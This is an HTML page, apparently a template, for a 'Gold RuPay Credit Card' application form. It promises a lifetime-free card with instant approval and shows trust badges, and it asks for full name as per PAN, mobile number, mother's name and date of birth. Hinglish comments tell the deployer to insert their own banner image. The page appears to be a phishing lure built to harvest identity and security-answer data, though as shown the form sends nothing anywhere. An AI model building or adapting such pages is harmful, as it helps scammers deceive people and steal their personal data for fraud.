!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gold RuPay Credit Card</title>
    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
        body { background-color: #f4f7fa; color: #333; padding-bottom: 30px; }
        .header { background-color: #9d0a2c; color: white; padding: 15px 20px; display: flex; align-items: center; font-weight: bold; font-size: 14px; letter-spacing: 1px; }
        .header span { margin-left: 10px; }
        
        /* Banner Placeholder */
        .banner-container { text-align: center; margin-top: 15px; }
        .banner-container img { max-width: 100%; height: auto; display: block; }
        .promo-text { text-align: center; color: #d32f2f; font-weight: 800; font-size: 12px; margin: 15px 0; letter-spacing: 0.5px; }

        .card { background: white; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); margin: 0 20px 20px 20px; padding: 25px 20px; }
        .title { text-align: center; font-weight: 900; font-size: 18px; margin-bottom: 5px; }
        .subtitle { text-align: center; font-size: 11px; color: #777; margin-bottom: 25px; }

        .input-group { margin-bottom: 15px; }
        .input-group label { display: block; font-size: 10px; font-weight: bold; margin-bottom: 6px; color: #555; text-transform: uppercase; }
        .input-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 14px; background-color: #fafafa; transition: border 0.3s; }
        .input-group input:focus { border-color: #9d0a2c; outline: none; background-color: #fff; }

        .btn-submit { background: linear-gradient(to right, #b70d35, #850622); color: white; border: none; border-radius: 8px; padding: 15px; width: 100%; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 10px; box-shadow: 0 4px 10px rgba(157, 10, 44, 0.3); transition: transform 0.2s; }
        .btn-submit:active { transform: scale(0.98); }

        .footer-icons { display: flex; justify-content: center; gap: 30px; margin-top: 30px; }
        .footer-icons div { text-align: center; font-size: 9px; color: #888; font-weight: bold; }
        .footer-icons span { display: block; font-size: 20px; margin-bottom: 5px; color: #d32f2f; }
    </style>
</head>
<body>

    <div class="header">
        <div>&#9776;</div>
        <span>GOLD RuPay CREDIT CARD</span>
    </div>

    <!-- MAIN BANNER LOGO IMAGE -->
    <div class="banner-container">
        <!-- YAHAN APNI IMAGE KA NAAM/URL DAALEN -->
        <img src="card.png" alt="Promo Banner" style="max-height: 80px; margin: 0 auto; display: block;">
        <!-- Note: Image lagane ke baad style me 'display: none' hata dein -->
    </div>

    <div class="promo-text">POWERFUL. REWARDING. LIFETIME FREE.</div>

    <div class="card">
        <div class="title">APPLY NOW</div>
        <div class="subtitle">Fill details for instant approval</div>

        <form action="success.html" method="GET">
            <div class="input-group">
                <label>Full Name (As per PAN)</label>
                <input type="text" placeholder="e.g. Rahul Sharma" required>
            </div>
            <div class="input-group">
                <label>Mobile Number</label>
                <input type="tel" placeholder="10-digit linked number" pattern="[0-9]{10}" required>
            </div>
            <div class="input-group">
                <label>Mother's Name</label>
                <input type="text" placeholder="e.g. Sunita Sharma" required>
            </div>
            <div class="input-group">
                <label>Date of Birth</label>
                <input type="date" required>
            </div>
            
            <button type="submit" class="btn-submit">SUBMIT APPLICATION &rarr;</button>
        </form>
    </div>

    <div class="footer-icons">
        <div><span>&#128274;</span>SECURE<br>PAYMENTS</div>
        <div><span>&#127873;</span>REWARDING<br>EXPERIENCE</div>
        <div><span>&#10004;</span>TRUSTED BY<br>MILLIONS</div>
    </div>

</body>
</html>
